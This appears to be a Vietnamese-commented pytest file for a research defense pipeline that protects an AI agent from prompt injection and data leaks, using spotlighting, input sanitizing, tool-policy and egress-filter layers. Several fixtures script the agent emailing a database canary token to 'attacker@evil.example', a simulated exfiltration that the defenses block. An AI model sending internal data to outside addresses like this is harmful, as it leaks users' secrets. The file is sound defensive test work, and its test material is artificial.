"""Pipeline phòng thủ (STT-55) — điều kiện đạt ở Kế hoạch: đọc defenses.yaml, cắm từng cơ chế vào
đúng hook của lõi agent, hỗ trợ mọi tổ hợp bật/tắt, ghi cấu hình đang bật vào trace.

Ở đây chỉ kiểm phần ghép: preset/override/tổ hợp, định tuyến hook theo `pipeline_order`, thứ tự
D2 → D1 và D3 → D4, ảnh chụp cấu hình, lỗi cấu hình. Hành vi từng cơ chế đã có test riêng
(`test_d1_*` … `test_d4_*`); bộ unit test 4 cơ chế theo đặc tả là STT-56.
"""

from __future__ import annotations

import copy
import itertools
import json
import sqlite3
from typing import Any

import pytest

from agent.core import CoreA
from agent.llm_client import LLMResult, ToolCall
from defense import d1_spotlighting
from defense.pipeline import REPO_ROOT as REPO
from defense.pipeline import DefensePipeline, load_defenses_raw, runnable_presets
from interfaces import DefenseLayer, HookStage, NoDefense, SessionState, ToolResult, ToolSpec

RAW = load_defenses_raw()
KEYS = list(RAW["defenses"])
CANARIES = (
    "CANARY_SYSPROMPT_7c1e2f90-4b3a-4d5e-8f60-1a2b3c4d5e6f",
    "CANARY_DB_3f2a9c1e-7b44-4d2e-9a10-5c6d7e8f9a0b",
)
with sqlite3.connect(REPO / "data" / "customers.db") as _conn:
    CUSTOMER = _conn.execute("SELECT contact_email FROM customers WHERE id = 3").fetchone()[0]


def _session(task_type: str | None = "SEND_MAIL", run_id: str = "run-p") -> SessionState:
    return SessionState(run_id=run_id, task_type=task_type, run_canaries=CANARIES)


def _call(name: str, args: dict[str, Any], cid: str = "c1") -> ToolCall:
    return ToolCall(id=cid, name=name, arguments=args, arguments_raw=json.dumps(args))


def _mail(body: str, to: str = CUSTOMER) -> ToolCall:
    return _call("send_email", {"to": to, "subject": "Báo giá", "body": body})


def _defenses(hits) -> list[str]:
    return [h.defense for h in hits]


@pytest.fixture(autouse=True)
def _clean_d1():
    yield
    d1_spotlighting.clear_all_runs()


# ---------------------------------------------------------------------------
# Chọn cơ chế: preset · override · mọi tổ hợp
# ---------------------------------------------------------------------------


def test_customer_email_co_trong_db():
    allow = DefensePipeline(enabled=["d4_egress_filter"])._allowlist
    assert CUSTOMER in allow.customer_emails


@pytest.mark.parametrize("preset", runnable_presets(RAW))
def test_moi_preset_chay_duoc_dung_duoc(preset):
    p = DefensePipeline(preset=preset)
    assert isinstance(p, DefenseLayer)
    assert set(p.enabled) == set(RAW["presets"][preset])
    snap = p.config_snapshot()
    assert snap["preset"] == preset
    assert snap["enabled"] == list(p.enabled)
    json.dumps(snap, ensure_ascii=False)  # ghi được vào runs.defense_config


@pytest.mark.parametrize(
    "combo",
    [c for n in range(len(KEYS) + 1) for c in itertools.combinations(KEYS, n)],
    ids=lambda c: "+".join(k[:2] for k in c) or "none",
)
def test_moi_to_hop_bat_tat(combo):
    p = DefensePipeline(enabled=list(reversed(combo)))
    assert p.enabled == combo  # thứ tự theo khai báo trong defenses.yaml, không theo bên gọi
    assert p.config_snapshot()["enabled"] == list(combo)
    s = _session()
    p.transform(HookStage.CONTEXT_ASSEMBLY, "mô tả", source="tool_description", session=s)
    p.gate(HookStage.PRE_TOOL_EXECUTION, _call("search_kb", {"query": "x"}), session=s)


def test_khong_truyen_gi_doc_co_enabled_cua_khoi():
    raw = copy.deepcopy(RAW)
    raw["defenses"]["d2_input_sanitizer"]["enabled"] = True
    p = DefensePipeline(raw=raw)
    assert p.enabled == ("d2_input_sanitizer",)
    assert p.preset == "custom"


def test_preset_override_ap_va_khong_doi_cau_hinh_goc():
    raw = copy.deepcopy(RAW)
    p = DefensePipeline(preset="d3_no_confirm", raw=raw)
    r4 = p.blocks["d3_tool_policy"]["rules"]["R4_require_confirmation"]
    assert r4["enabled"] is False
    assert raw == RAW
    plain = DefensePipeline(preset="d3_only")
    assert plain.blocks["d3_tool_policy"]["rules"]["R4_require_confirmation"]["enabled"] is True
    assert p.config_snapshot() != plain.config_snapshot()
    assert p.config_snapshot()["overrides"] == RAW["preset_overrides"]["d3_no_confirm"]


def test_off_trung_anh_chup_nodefense():
    assert DefensePipeline(preset="off").config_snapshot() == NoDefense().config_snapshot()


def test_anh_chup_tat_dinh_va_doi_theo_tham_so():
    a = DefensePipeline(preset="all").config_snapshot()
    assert a == DefensePipeline(preset="all").config_snapshot()
    raw = copy.deepcopy(RAW)
    raw["defenses"]["d4_egress_filter"]["params"]["url_entropy_block"]["max_encoded_segment_len"] = 99
    assert DefensePipeline(preset="all", raw=raw).config_snapshot() != a
    assert a["defenses"]["d1_spotlighting"]["enabled"] is True
    assert set(a["files_sha256"]) == {
        RAW["defenses"]["d2_input_sanitizer"]["params"]["imperative_patterns_file"]
    }


# ---------------------------------------------------------------------------
# Định tuyến hook theo pipeline_order
# ---------------------------------------------------------------------------


def test_khong_co_che_nao_bat_hanh_xu_nhu_nodefense():
    p, s = DefensePipeline(enabled=[]), _session()
    for stage, source in [
        (HookStage.KB_RETRIEVAL, "kb_chunk"),
        (HookStage.TOOL_RESULT, "tool_result"),
        (HookStage.CONTEXT_ASSEMBLY, "tool_description"),
    ]:
        t = p.transform(stage, "a​b", source=source, session=s)
        assert (t.text, t.hits) == ("a​b", ())
    for stage in (HookStage.PRE_TOOL_EXECUTION, HookStage.PRE_EGRESS):
        d = p.gate(stage, _mail(CANARIES[1], to="x@evil.example"), session=s)
        assert d.allowed and d.hits == ()


def test_d2_chi_chay_o_kb_retrieval_va_tool_result():
    p, s = DefensePipeline(enabled=["d2_input_sanitizer"]), _session()
    for stage, source in [(HookStage.KB_RETRIEVAL, "kb_chunk"), (HookStage.TOOL_RESULT, "tool_result")]:
        t = p.transform(stage, "a​b", source=source, session=s)
        assert t.text == "ab"
        assert {h.stage for h in t.hits} == {stage.value}
    t = p.transform(HookStage.CONTEXT_ASSEMBLY, "a​b", source="kb_chunk", session=s)
    assert (t.text, t.hits) == ("a​b", ())


def test_d1_chi_chay_o_context_assembly_ca_ba_nguon():
    p, s = DefensePipeline(enabled=["d1_spotlighting"]), _session()
    t = p.transform(HookStage.KB_RETRIEVAL, "chunk", source="kb_chunk", session=s)
    assert (t.text, t.hits) == ("chunk", ())
    for source in ("kb_chunk", "tool_description", "tool_result"):
        t = p.transform(HookStage.CONTEXT_ASSEMBLY, "nội dung", source=source, session=s)
        assert "nội dung" in t.text and t.text != "nội dung"
        assert _defenses(t.hits) == ["d1_spotlighting"]


def test_d2_lam_sach_truoc_d1_boc():
    p, s = DefensePipeline(preset="all"), _session()
    t1 = p.transform(HookStage.KB_RETRIEVAL, "giá​ 5 triệu", source="kb_chunk", session=s)
    t2 = p.transform(HookStage.CONTEXT_ASSEMBLY, t1.text, source="kb_chunk", session=s)
    assert "​" not in t2.text and "giá 5 triệu" in t2.text
    assert _defenses(t1.hits + t2.hits) == ["d2_input_sanitizer", "d1_spotlighting"]


def test_d3_chi_o_pre_tool_execution_d4_chi_o_pre_egress():
    p, s = DefensePipeline(preset="all"), _session(task_type="SEND_MAIL")
    d3 = p.gate(HookStage.PRE_TOOL_EXECUTION, _mail("chào anh"), session=s)
    assert not d3.allowed  # R4: chạy tự động thì xác nhận quy về chặn
    assert set(_defenses(d3.hits)) == {"d3_tool_policy"}
    d4 = p.gate(HookStage.PRE_EGRESS, _mail(f"mã {CANARIES[1]}"), session=s)
    assert not d4.allowed
    assert {h.rule for h in d4.hits} >= {"E1_canary"}
    assert set(_defenses(d4.hits)) == {"d4_egress_filter"}


def test_d3_no_confirm_cho_mail_hop_le_qua_ca_hai_gate():
    p, s = DefensePipeline(preset="d3_no_confirm"), _session(task_type="SEND_MAIL")
    for stage in (HookStage.PRE_TOOL_EXECUTION, HookStage.PRE_EGRESS):
        d = p.gate(stage, _mail("Gửi anh báo giá BG-2026-014."), session=s)
        assert d.allowed and d.hits == ()


def test_d4_bo_qua_tool_khong_ra_ngoai():
    p, s = DefensePipeline(enabled=["d4_egress_filter"]), _session()
    d = p.gate(HookStage.PRE_EGRESS, _call("query_customer_db", {"q": CANARIES[1]}), session=s)
    assert d.allowed and d.hits == ()


def test_goi_sai_loai_hook_la_loi():
    p, s = DefensePipeline(preset="all"), _session()
    with pytest.raises(ValueError, match="loại gate"):
        p.transform(HookStage.PRE_EGRESS, "x", source="kb_chunk", session=s)
    with pytest.raises(ValueError, match="loại transform"):
        p.gate(HookStage.KB_RETRIEVAL, _mail("x"), session=s)
    with pytest.raises(ValueError, match="không nhận nguồn"):
        p.transform(HookStage.KB_RETRIEVAL, "x", source="tool_result", session=s)


def test_end_run_don_delimiter_d1():
    p, s = DefensePipeline(enabled=["d1_spotlighting"]), _session(run_id="run-end")
    a = p.transform(HookStage.CONTEXT_ASSEMBLY, "x", source="kb_chunk", session=s).text
    assert a == p.transform(HookStage.CONTEXT_ASSEMBLY, "x", source="kb_chunk", session=s).text
    p.end_run("run-end")
    assert "run-end" not in d1_spotlighting._RUN_DELIMITERS


# ---------------------------------------------------------------------------
# Lỗi cấu hình — hỏng ồn ào lúc dựng, không lúc chạy giữa lô
# ---------------------------------------------------------------------------


def _raw(mutate) -> dict[str, Any]:
    raw = copy.deepcopy(RAW)
    mutate(raw)
    return raw


@pytest.mark.parametrize(
    ("kwargs", "msg"),
    [
        ({"preset": "all", "enabled": []}, "không cả hai"),
        ({"preset": "khong_co"}, "không chạy được"),
        ({"preset": "reduced_3"}, "không chạy được"),
        ({"enabled": ["d5_la"]}, "cơ chế lạ"),
    ],
)
def test_tham_so_sai_bi_tu_choi(kwargs, msg):
    with pytest.raises(ValueError, match=msg):
        DefensePipeline(**kwargs)


@pytest.mark.parametrize(
    ("mutate", "kwargs", "msg"),
    [
        (
            lambda r: r["preset_overrides"]["d3_no_confirm"].update({"d3_tool_policy.rules.R9": 1}),
            {"preset": "d3_no_confirm"},
            "không có khóa",
        ),
        (
            lambda r: r["preset_overrides"].update({"d1_only": {"d3_tool_policy.enabled": True}}),
            {"preset": "d1_only"},
            "không bật trong preset",
        ),
        (
            lambda r: r["pipeline_order"][0].update({"stage": "ingest (K1)"}),
            {"preset": "off"},
            "không phải HookStage",
        ),
        (
            lambda r: r["pipeline_order"].pop(),
            {"preset": "d4_only"},
            "không nằm ở stage nào",
        ),
        (
            lambda r: r["defenses"]["d3_tool_policy"].update({"entrypoint": "khong_co"}),
            {"preset": "d3_only"},
            "không có hàm",
        ),
        (
            lambda r: r["defenses"]["d4_egress_filter"]["rules"].pop("E3_pii"),
            {"preset": "d4_only"},
            "thiếu",
        ),
    ],
)
def test_cau_hinh_sai_bi_tu_choi(mutate, kwargs, msg):
    with pytest.raises(ValueError, match=msg):
        DefensePipeline(raw=_raw(mutate), **kwargs)


# ---------------------------------------------------------------------------
# Tích hợp: lõi agent + pipeline + trace
# ---------------------------------------------------------------------------


def _result(text=None, calls=None) -> LLMResult:
    return LLMResult(
        text=text, tool_calls=calls or [], tokens_in=1, tokens_out=1, latency_ms=1,
        target_id="A3", model="fake", response_model="fake", attempts=1,
        finish_reason="tool_calls" if calls else "stop",
    )


class _Model:
    def __init__(self, script):
        self.script = list(script)
        self.seen: list[list[dict[str, Any]]] = []

    def chat(self, messages, tools=None, **kw):
        self.seen.append([dict(m) for m in messages])
        return self.script.pop(0)


class _Tools:
    def __init__(self):
        self.executed: list[str] = []

    def list_tools(self):
        return [
            ToolSpec("search_kb", "Tra kho tri thức", {"type": "object"}, "read", False),
            ToolSpec("send_email", "Gửi thư", {"type": "object"}, "outbound", True),
        ]

    def call_tool(self, call):
        self.executed.append(call.name)
        return ToolResult(call_id=call.id, name=call.name, content="Bảng giá​: 5 triệu")


class _Recorder:
    def __init__(self):
        self.steps: list[dict[str, Any]] = []

    def step(self, *, kind, **fields):
        self.steps.append({"kind": kind, **fields})

    def finish(self, **result):  # pragma: no cover - lõi agent không gọi
        raise AssertionError


def test_tich_hop_core_a_preset_all():
    exfil = _mail(f"Mã: {CANARIES[1]}", to="attacker@evil.example")
    model = _Model([
        _result(calls=[_call("search_kb", {"query": "giá"}, cid="c1")]),
        _result(calls=[ToolCall("c2", exfil.name, exfil.arguments, exfil.arguments_raw)]),
        _result(text="Xong."),
    ])
    tools = _Tools()
    pipeline = DefensePipeline(preset="all")
    core = CoreA(model=model, tools=tools, defense=pipeline, system_prompt="sys",
                 max_steps=4, max_tokens=64)
    session = SessionState(run_id="run-int", task_type="SEND_MAIL", run_canaries=CANARIES)
    rec = _Recorder()
    out = core.run("Báo giá cho khách", session=session, recorder=rec)

    assert out.defense_blocked and tools.executed == ["search_kb"]
    # Kết quả tool (K1 qua search_kb) đi D2 rồi D1 trước khi vào messages.
    tool_msg = model.seen[1][-1]
    assert "\u200b" not in tool_msg["content"] and "Bảng giá: 5 triệu" in tool_msg["content"]
    hits = {st["kind"]: st["defense_hits"] for st in rec.steps if st["kind"] != "llm"}
    assert [h["defense"] for h in hits["tool"]] == ["d2_input_sanitizer", "d1_spotlighting"]
    assert {h["defense"] for h in hits["defense"]} == {"d3_tool_policy"}
    # Mô tả tool (K2a) chỉ qua D1 — hit gắn bước llm đầu tiên.
    assert {h["defense"] for h in rec.steps[0]["defense_hits"]} == {"d1_spotlighting"}
    d1_spotlighting.clear_run("run-int")
